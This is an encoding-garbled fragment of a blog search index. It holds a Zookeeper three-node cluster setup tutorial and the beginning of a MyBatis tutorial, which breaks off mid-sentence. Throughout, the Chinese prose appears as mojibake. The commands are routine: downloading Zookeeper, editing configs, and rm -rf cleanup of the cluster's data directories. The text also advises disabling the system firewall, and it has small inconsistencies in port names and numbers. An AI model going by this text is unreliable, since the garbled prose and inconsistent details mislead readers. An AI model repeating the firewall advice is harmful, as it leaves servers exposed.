å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼Œä½¿ç”¨å¤šå°ç‰©ç†æœºå™¨æ­å»º Zookeeper é›†ç¾¤ã€‚ Zookeeper ç®€ä»‹Zookeeper æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ï¼Œå¯ä»¥æä¾›é…ç½®ä¿¡æ¯ç®¡ç†ã€å‘½åã€åˆ†å¸ƒå¼åŒæ­¥ã€é›†ç¾¤ç®¡ç†ã€æ•°æ®åº“åˆ‡æ¢ç­‰æœåŠ¡ã€‚å®ƒä¸é€‚åˆç”¨æ¥å­˜å‚¨å¤§é‡ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥å­˜å‚¨ä¸€äº›é…ç½®ã€å‘å¸ƒä¸è®¢é˜…ç­‰å°‘é‡ä¿¡æ¯ã€‚Hadoopã€Stormã€æ¶ˆæ¯ä¸­é—´ä»¶ã€RPC æœåŠ¡æ¡†æ¶ã€åˆ†å¸ƒå¼æ•°æ®åº“åŒæ­¥ç³»ç»Ÿï¼Œè¿™äº›éƒ½æ˜¯ Zookeeper çš„åº”ç”¨åœºæ™¯ã€‚ Zookeeper é›†ç¾¤ç®€ä»‹åœ¨ Linux ç”Ÿäº§ç¯å¢ƒä¸Šæ­å»º Zookeeper é›†ç¾¤ï¼Œè‡³å°‘éœ€è¦ä¸‰ä¸ªèŠ‚ç‚¹ï¼ˆæœåŠ¡å™¨ï¼‰ã€‚ è§’è‰²åˆ’åˆ†Zookeeper é›†ç¾¤æœ‰ä¸‰ç§è§’è‰²åˆ’åˆ†ï¼Œåˆ†åˆ«æ˜¯ leaderã€followerã€observerï¼š é¢†å¯¼è€…ï¼ˆleaderï¼‰ï¼šè´Ÿè´£è¿›è¡ŒæŠ•ç¥¨çš„å‘èµ·å’Œå†³è®®ï¼Œæ›´æ–°ç³»ç»ŸçŠ¶æ€ã€‚ è·Ÿéšè€…ï¼ˆfollowerï¼‰ï¼šç”¨äºæ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å‘å®¢æˆ·ç«¯è¿”å›ç»“æœï¼Œä»¥åŠåœ¨é€‰ä¸¾è¿‡ç¨‹ä¸­å‚ä¸æŠ•ç¥¨ è§‚å¯Ÿè€…ï¼ˆobserverï¼‰ï¼šå¯ä»¥æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ï¼Œå°†å†™è¯·æ±‚è½¬å‘ç»™ leader èŠ‚ç‚¹ï¼Œä½†æ˜¯ä¸å‚ä¸æŠ•ç¥¨è¿‡ç¨‹ï¼ŒåªåŒæ­¥ leader çš„çŠ¶æ€ï¼Œé€šå¸¸ç”¨ä½œå¯¹æŸ¥è¯¢æ“ä½œåšè´Ÿè½½ã€‚ ç«¯å£ä½œç”¨ 2181ï¼šå¯¹å®¢æˆ·ç«¯ç«¯æä¾›æœåŠ¡ 2888: é›†ç¾¤å†…æœºå™¨ç›¸äº’é€šä¿¡ä½¿ç”¨ 3888: é€‰ä¸¾ leader ä½¿ç”¨ Zookeeper é›†ç¾¤æ­å»ºé›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· èŠ‚ç‚¹ 1 192.168.1.1 2181, 2881, 3881 3.4.10 èŠ‚ç‚¹ 2 192.168.1.2 2181, 2881, 3881 3.4.10 èŠ‚ç‚¹ 3 192.168.1.3 2181, 2881, 3881 3.4.10 é›†ç¾¤æ­å»º Zookeeper ä¸‹è½½ Zookeeper çš„æœ€æ–°ç‰ˆæœ¬å¯ä»¥ä» å®˜ç½‘ ä¸‹è½½ï¼Œå†å²ç‰ˆæœ¬åˆ™å¯ä»¥ä» è¿™é‡Œ ä¸‹è½½ã€‚ Zookeeper å®‰è£… 1234567891011121314151617# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/zookeeper-cluster# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/zookeeper-cluster# ä¸‹è½½å‹ç¼©åŒ…# wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf zookeeper-3.4.10.tar.gz# é‡å‘½åç›®å½•# mv zookeeper-3.4.10 zookeeper-node-1# åˆ é™¤å‹ç¼©åŒ…# rm -rf zookeeper-3.4.10.tar.gz Zookeeper é…ç½® 1234567891011121314# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/zookeeper-cluster/zookeeper-node-1# åˆ›å»ºæ•°æ®å­˜å‚¨ç›®å½•# mkdir data# åˆ›å»ºæ—¥å¿—å­˜å‚¨ç›®å½•# mkdir logs# å¤åˆ¶é…ç½®æ–‡ä»¶# cp conf/zoo_sample.cfg conf/zoo.cfg# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šä»¥ä¸‹å†…å®¹å³å¯ï¼‰# vim conf/zoo.cfg 123456789# åŸºç¡€é…ç½®clientPort=2181dataDir=/usr/local/zookeeper-cluster/zookeeper-node-1/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-1/logs# é›†ç¾¤é…ç½®server.1=192.168.1.1:2881:3881server.2=192.168.1.2:2881:3881server.3=192.168.1.3:2881:3881 æç¤º server.1=192.168.1.1:2881:3881ï¼Œåˆ†åˆ«å¯¹åº” server.serverid=host:tickpot:electionport serveridï¼šæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºè¿™æ˜¯ç¬¬å‡ å·æœåŠ¡å™¨ã€‚ä¸‹æ–‡æåˆ°çš„ myid æ–‡ä»¶é‡Œé¢æœ‰ä¸€ä¸ªæ•°æ®å°±æ˜¯å®ƒçš„å€¼ã€‚Zookeeper å¯åŠ¨æ—¶ä¼šè¯»å–è¯¥æ–‡ä»¶ï¼Œç„¶åæ‹¿åˆ°é‡Œé¢çš„æ•°æ®ä¸ zoo.cfg é‡Œé¢çš„é…ç½®ä¿¡æ¯æ¯”è¾ƒï¼Œä»è€Œåˆ¤æ–­å½“å‰èŠ‚ç‚¹æ˜¯å“ªä¸ª server hostï¼šæœåŠ¡å™¨çš„åœ°å€ï¼Œå³ä¸»æœºå / IP åœ°å€ tickpotï¼šæœåŠ¡å™¨ Follower ä¸é›†ç¾¤ä¸­çš„ Leader æœåŠ¡å™¨äº¤æ¢ä¿¡æ¯çš„ç«¯å£ electionportï¼šç”¨æ¥æ‰§è¡Œé€‰ä¸¾æ—¶æœåŠ¡å™¨ç›¸äº’é€šä¿¡çš„ç«¯å£ Zookeeper åˆ›å»º myid æ–‡ä»¶ åœ¨ Zookeeper çš„ data ç›®å½•ä¸‹åˆ›å»º myid æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯æ˜¯ 1ï¼ˆæœåŠ¡å™¨ç¼–å·ï¼‰ã€‚ 12# åˆ›å»ºmyidæ–‡ä»¶ï¼Œå¹¶å†™å…¥æ•°æ®# echo "1" &gt; /usr/local/zookeeper-cluster/zookeeper-node-1/data/myid æ³¨æ„ myid æ–‡ä»¶é‡Œçš„æœåŠ¡å™¨ç¼–å·å¯ä»¥è‡ªå®šä¹‰ï¼ˆå…¨å±€å”¯ä¸€ï¼‰ï¼Œä½†æ˜¯ä¸Šä¸‹ä¸è¦æœ‰ç©ºè¡Œï¼Œå·¦å³ä¸è¦æœ‰ç©ºæ ¼ã€‚ Zookeeper åˆ›å»ºå¤šä¸ªèŠ‚ç‚¹ å¤åˆ¶ä¸¤ä»½ä¸Šé¢å·²ç»é…ç½®å¥½çš„ Zookeeper å®‰è£…ç›®å½•åˆ°å…¶ä»–æœåŠ¡å™¨èŠ‚ç‚¹ä¸Šï¼Œä»¥æ­¤ä½œä¸ºé›†ç¾¤ä¸­å¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶ï¼Œä¾‹å¦‚ zookeeper-node-2 å’Œ zookeeper-node-3ã€‚å®‰è£…ç›®å½•å¤åˆ¶å®Œæˆåï¼Œè¿˜éœ€è¦æ›´æ”¹æ¯ä¸ªæ–°èŠ‚ç‚¹é‡Œçš„ zoo.cfg é…ç½®æ–‡ä»¶çš„ dataDir ä¸ dataLogDirï¼Œå¹¶é‡æ–°æŒ‡å®š myid æ–‡ä»¶é‡Œçš„æœåŠ¡å™¨ç¼–å·ã€‚ä¾‹å¦‚ï¼š 123456# èŠ‚ç‚¹äºŒçš„zoo.cfgæ–‡ä»¶dataDir=/usr/local/zookeeper-cluster/zookeeper-node-2/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-2/logs# å†™å…¥èŠ‚ç‚¹äºŒçš„myidæ–‡ä»¶# echo "2" &gt; /usr/local/zookeeper-cluster/zookeeper-node-2/data/myid 123456# èŠ‚ç‚¹ä¸‰çš„zoo.cfgæ–‡ä»¶dataDir=/usr/local/zookeeper-cluster/zookeeper-node-3/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-3/logs# å†™å…¥èŠ‚ç‚¹ä¸‰çš„myidæ–‡ä»¶# echo "3" &gt; /usr/local/zookeeper-cluster/zookeeper-node-3/data/myid é›†ç¾¤ç®¡ç†é˜²ç«å¢™å¯åŠ¨ Zookeeper é›†ç¾¤ä¹‹å‰ï¼Œå»ºè®®å…³é—­ç³»ç»Ÿé˜²ç«å¢™ï¼Œè¿™å¯ä»¥ä¿è¯é›†ç¾¤ä¹‹é—´å¯ä»¥æ­£å¸¸äº’ç›¸é€šä¿¡ï¼Œå¦åˆ™æŸ¥çœ‹ Zookeeper çŠ¶æ€å¯èƒ½ä¼šå‘ç°æŠ¥å¦‚ä¸‹çš„é”™è¯¯ï¼š 12Client port found: 2181. Client address: 192.168.1.1.Error contacting service. It is probably not running. ç®¡ç†å‘½ä»¤å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒZookeeper çš„ç®¡ç†å‘½ä»¤ï¼ˆShell è„šæœ¬ï¼‰éƒ½åœ¨å¯¹åº”å®‰è£…ç›®å½•çš„ bin ç›®å½•ä¸‹ã€‚ 12345678# å¯åŠ¨æœåŠ¡# ./zkServer.sh start# å…³é—­æœåŠ¡# ./zkServer.sh stop# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# ./zkServer.sh status æˆ–è€…æŒ‡å®šé…ç½®æ–‡ä»¶è¿›è¡Œæ“ä½œï¼š 12345678# å¯åŠ¨æœåŠ¡# ./zkServer.sh start ../conf/zoo.cfg # å…³é—­æœåŠ¡# ./zkServer.sh stop ../conf/zoo.cfg # æŸ¥çœ‹æœåŠ¡çŠ¶æ€# ./zkServer.sh status ../conf/zoo.cfg é›†ç¾¤å¯åŠ¨ å¯åŠ¨é›†ç¾¤ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh start æŸ¥çœ‹çŠ¶æ€ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status é›†ç¾¤æ­£å¸¸å¯åŠ¨åï¼Œå„ä¸ªèŠ‚ç‚¹è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼Œæ­¤æ—¶é›†ç¾¤çš„ Leader æ˜¯èŠ‚ç‚¹äºŒ 123456789101112131415ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-2/bin/../conf/zoo.cfgMode: leader-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: follower å…³é—­é›†ç¾¤ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh stop æ¸…ç©ºæ•°æ® è‹¥å¸Œæœ›æ¸…ç©º Zookeper é›†ç¾¤çš„æ•°æ®ï¼Œåˆ™å¯ä»¥å…ˆå…³é—­é›†ç¾¤ï¼Œç„¶åå†åˆ é™¤ Zookeeper å®‰è£…ç›®å½•ä¸‹çš„ data å’Œ logs å­ç›®å½•ä¸‹çš„æ•°æ®æ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ myid æ–‡ä»¶ï¼‰å³å¯ã€‚æ¸…ç©ºæ•°æ®çš„æ“ä½œä¸å¯æ¢å¤ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹æ…ç”¨ã€‚ 123456# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/logs/version-2 æµ‹è¯•é›†ç¾¤æ•°æ®åŒæ­¥æµ‹è¯• è¿æ¥èŠ‚ç‚¹ä¸€ï¼Œå¹¶åˆ›å»ºæ–‡ä»¶å¤¹ 12345678910# è¿æ¥èŠ‚ç‚¹ä¸€# ./zkCli.sh -server 192.168.1.1:2181# åˆ›å»ºæ–‡ä»¶å¤¹[zk: 192.168.1.1:2181(CONNECTED) 3] create /test ""Created /test# æŸ¥çœ‹ç›®å½•ä¿¡æ¯[zk: 192.168.1.1:2181(CONNECTED) 4] ls /[zookeeper, test] æ­¤æ—¶è¿æ¥å…¶ä»–ä»»æ„èŠ‚ç‚¹ï¼Œå¯ä»¥å‘ç° test æ–‡ä»¶å¤¹ä¼šåŒæ­¥åˆ›å»ºï¼Œå³åœ¨ä»»ä½•ä¸€ä¸ªé›†ç¾¤èŠ‚ç‚¹è¿›è¡Œæ“ä½œï¼Œå…¶ä»–é›†ç¾¤èŠ‚ç‚¹ä¹Ÿä¼šåŒæ­¥æ›´æ–°ã€‚ 123456# è¿æ¥èŠ‚ç‚¹äºŒ# ./zkCli.sh -server 192.168.1.2:2181# æŸ¥çœ‹ç›®å½•ä¿¡æ¯[zk: 192.168.1.2:2181(CONNECTED) 0] ls /[zookeeper, test] å®•æœºé‡æ–°é€‰ä¸¾æµ‹è¯• å…³é—­ Leaderï¼ˆèŠ‚ç‚¹äºŒï¼‰ 1# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop æŸ¥çœ‹å…¶ä»–èŠ‚ç‚¹çš„çŠ¶æ€ï¼ˆèŠ‚ç‚¹ä¸€ã€èŠ‚ç‚¹ä¸‰ï¼‰ 12# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status å…³é—­ Leaderï¼ˆèŠ‚ç‚¹äºŒï¼‰ï¼Œç­‰å¾…è¶…æ—¶æ—¶é—´åˆ°äº†ä¹‹åï¼Œé‡æ–°æŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€ï¼Œä¼šå‘ç°èŠ‚ç‚¹ä¸‰è¢«é€‰ä¸¾ä¸ºæ–°çš„ Leaderã€‚ 123456789ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: leader å‚è€ƒåšå®¢ Linux ä¹‹ Zookeeper é›†ç¾¤æ­å»º var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹ä¸€",url:"/posts/ed9d29ae.html",text:'å‰è¨€MyBatis ç®€ä»‹MyBatis æ˜¯æ”¯æŒå®šåˆ¶åŒ– SQLã€å­˜å‚¨è¿‡ç¨‹ä»¥åŠé«˜çº§æ˜ å°„çš„æŒä¹…å±‚æ¡†æ¶ï¼ˆORMï¼‰ã€‚MyBatis å¯ä»¥ä½¿ç”¨ç®€å•çš„ XML æˆ–æ³¨è§£ç”¨äºé…ç½®å’Œæ˜ å°„æ•°æ®è¡¨ï¼Œå°† POJOï¼ˆPlain Old Java Objectsï¼Œæ™®é€šçš„ Java å¯¹è±¡ï¼‰æ˜ å°„æˆæ•°æ®è¡¨ä¸­çš„è®°å½•ã€‚ MyBatis å†å²MyBatis çš„å‰èº«æ˜¯ Apache çš„ä¸€ä¸ªå¼€æºé¡¹ç›® iBatisï¼Œ2010 å¹´è¿™ä¸ªé¡¹ç›®ç”± Apache Software Foundation è¿ç§»åˆ°äº† Google Codeï¼Œå¹¶ä¸”æ”¹åä¸º MyBatisï¼Œæœ€åäº 2013 å¹´ 11 æœˆ è¿ç§»åˆ°äº† GitHubï¼ˆè‡³ä»Šï¼‰ã€‚iBATIS ä¸€è¯æ¥æºäº â€œinternetâ€ å’Œ â€œabatisâ€ çš„ç»„åˆï¼Œæ˜¯ä¸€ä¸ªåŸºäº Java çš„æŒä¹…å±‚æ¡†æ¶ã€‚iBATIS æä¾›çš„æŒä¹…å±‚æ¡†æ¶åŒ…æ‹¬ SQL Maps å’Œ Data Access Objectsï¼ˆDAOï¼‰ã€‚ MyBatis ç‰¹ç‚¹ç”±äºå•çº¯çš„ JDBC æ˜¯å°† SQL å†™åœ¨ä»£ç å—é‡Œï¼Œè€¦åˆåº¦é«˜ä¸”ç»´æŠ¤ä¸æ˜“ï¼Œæ‰€ä»¥å°±è¯ç”Ÿäº† ORM æ¡†æ¶ï¼Œè¯¸å¦‚ Hibernateã€Mybatis ç­‰ã€‚MyBatis å’Œ Hibernate éƒ½æ˜¯ å¯¹ JDBC æ›´åŠ æŠ½è±¡çš„å°è£…ï¼Œåº•å±‚éƒ½æ˜¯ JDBCï¼Œè¿™äºŒè€…çš„åŒºåˆ«åœ¨äº MyBatis æ˜¯ä¸€ä¸ªåŠè‡ªåŠ¨çš„æŒä¹…åŒ–å±‚æ¡†æ¶ï¼Œè€Œ Hibernate æ˜¯ä¸€ä¸ªå…¨è‡ªåŠ¨åŒ–çš„æŒä¹…åŒ–å±‚æ¡†æ¶ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ Hibernate æ˜¯æ—¨åœ¨æ¶ˆé™¤ SQL è¯­å¥ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬ä½¿ç”¨ Hibernate æ—¶æˆ‘ä»¬å¯ä»¥ä¸å†™ä¸€æ¡ SQLï¼Œå…¨äº¤ç»™æ¡†æ¶æ¥å¤„ç†ï¼Œä½†æ˜¯åœ¨å®é™…çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œé’ˆå¯¹ç‰¹å®šçš„åœºæ™¯æˆ‘ä»¬æ˜¯éœ€è¦è‡ªå·±å®šåˆ¶ä¼˜åŒ– SQL çš„ï¼Œé’ˆå¯¹äºæ­¤ï¼ŒHibernate æå‡ºäº† HQLï¼ˆä¸æ ‡å‡† SQL ç±»ä¼¼ï¼Œä½†æ˜¯å€¾å‘äºé¢å‘å¯¹è±¡çš„é£æ ¼ï¼‰ï¼Œä¸ºæ­¤æˆ‘ä»¬è¿˜éœ€è¦å­¦ä¹ ä¸‹ HQLã€‚è€Œ MyBatis ä¸ Hibernate æœ€å¤§çš„ä¸åŒå°±æ˜¯ï¼ŒMyBatis æ˜¯è®©æˆ‘ä»¬è‡ªå·±ç¼–å†™ SQL è¯­å¥ã€‚å¯ä»¥çœ‹å‡ºè¿™ä¸¤è€…ä¹‹é—´æ²¡æœ‰ç»å¯¹çš„å£å’ï¼Œå¦‚ä½•é€‰æ‹©å°±è¦è§†æƒ…å†µæ¥å®šã€‚æ›´å¤š MyBatis ç›¸å…³çš„èµ„æ–™å¯é˜…è¯» MyBatis å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ã€‚ æŒä¹…åŒ–å±‚æŠ€æœ¯å¯¹æ¯” JDBCâ€“ SQL å†™åœ¨ Java ä»£ç å—é‡Œï¼Œè€¦åˆåº¦é«˜å¯¼è‡´ç¡¬ç¼–ç å†…ä¼¤â€“ ç»´æŠ¤ä¸æ˜“ï¼Œä¸”å®é™…å¼€å‘éœ€æ±‚ä¸­ SQL å¾€å¾€æ˜¯ç»å¸¸å˜åŒ–çš„ï¼Œé¢‘ç¹ä¿®æ”¹çš„æƒ…å†µä¼šç»å¸¸å‡ºç° MyBatis åŠè‡ªåŠ¨çš„æŒä¹…åŒ–æ¡†æ¶ å®¹æ˜“å¯¹ SQL è¿›è¡Œé’ˆå¯¹æ€§çš„ä¼˜åŒ– SQL å’Œ Java åˆ†å¼€ç¼–å†™ï¼ŒåŠŸèƒ½è¾¹ç•Œæ¸…æ™°ï¼Œä¸€ä¸ªä¸“æ³¨äºä¸šåŠ¡ï¼Œå¦ä¸€ä¸ªä¸“æ³¨äºæ•°æ® Hibernate å’Œ JPA åå°„æ“ä½œå¤ªå¤šï¼Œå¯¼è‡´æ•°æ®åº“æ€§èƒ½ä¸‹é™â€“ å†…éƒ¨è‡ªåŠ¨ç”Ÿæˆ SQLï¼Œä¸å®¹æ˜“åšç‰¹æ®Šä¼˜åŒ–â€“ é•¿éš¾å¤æ‚ SQL å¯¹äº Hibernate è€Œè¨€å¤„ç†ä¹Ÿä¸å®¹æ˜“â€“ åŸºäºå…¨æ˜ å°„çš„å…¨è‡ªåŠ¨æ¡†æ¶ï¼Œæ‹¥æœ‰å¤§é‡å­—æ®µçš„ POJO è¿›è¡Œéƒ¨åˆ†æ˜ å°„æ—¶æ¯”è¾ƒå›°éš¾ï¼Œå¯¼è‡´æ•°æ®åº“æ€§èƒ½ä¸‹é™ å¿«é€Ÿå…¥é—¨æœ¬èŠ‚ä¼šä»‹ç»å¦‚ä½•å¼€å‘ç¬¬ä¸€ä¸ª MyBatis åº”ç”¨ï¼Œæ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-1ã€‚ åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;properties&gt; &lt;jdk.version&gt;1.8&lt;/jdk.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;slf4j.version&gt;1.7.30&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.17&lt;/log4j.version&gt; &lt;mybatis.version&gt;3.5.6&lt;/mybatis.version&gt; &lt;mybatis-generator&gt;1.4.0&lt;/mybatis-generator&gt; &lt;mysql-connector.version&gt;8.0.23&lt;/mysql-connector.version&gt;&lt;/properties&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;${junit.version}&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;${mybatis.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql-connector.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;version&gt;${slf4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;${log4j.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;${mybatis-generator}&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt; åˆ›å»º Maven å­æ¨¡å—å·¥ç¨‹åœ¨ Maven å­æ¨¡å—çš„ pom.xml ä¸­å¼•å…¥ä»¥ä¸‹ä¾èµ– 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;artifactId&gt;mybatis-lesson-1&lt;/artifactId&gt;&lt;name&gt;mybatis-lesson-1&lt;/name&gt;&lt;parent&gt; &lt;groupId&gt;com.clay.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-share&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åœ¨ Maven å­æ¨¡å—ä¸­åˆ›å»ºå®ä½“ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.clay.mybatis.bean;public class Employee { private Long id; private String lastName; private String gender; private String email; public Long getId() { return id; } public void setId(Long id) { this.id = id; } public String getLastName() { return lastName; } public void setLastName(String lastName) { this.lastName = lastName; } public String getGender() { return gender; } public void setGender(String gender) { this.gender = gender; } public String getEmail() { return email; } public void setEmail(String email) { this.email = email; } @Override public String toString() { return this.id + "_" + this.lastName + "_" + this.gender + "_" + this.email; }} åœ¨ Maven å­æ¨¡å—ä¸­åˆ›å»º SQL æ˜ å°„æ–‡ä»¶ï¼Œä¸»è¦å†…å®¹æ˜¯åœ¨å‘½åç©ºé—´ com.clay.mybatis.mapper.EmployeeMapper ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸º selectEmployee çš„æ˜ å°„è¯­å¥ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ Java ä»£ç ä¸­ä½¿ç”¨å…¨é™å®šå com.clay.mybatis.mapper.EmployeeMapper.selectEmployee æ¥è°ƒç”¨å”¯ä¸€çš„ SQL æ˜ å°„è¯­å¥ 1234567891011&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;!-- æŒ‡å®šå‘½åç©ºé—´ --&gt;&lt;mapper namespace="com.clay.mybatis.mapper.EmployeeMapper"&gt; &lt;select id="selectEmployee" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; æç¤º å½“ Java Bean çš„å±æ€§åä¸è¡¨å­—æ®µåä¸ä¸€æ ·æ—¶ï¼Œåœ¨ SQL ä¸­éœ€è¦ä½¿ç”¨å­—æ®µåˆ«åæ¥æ˜ 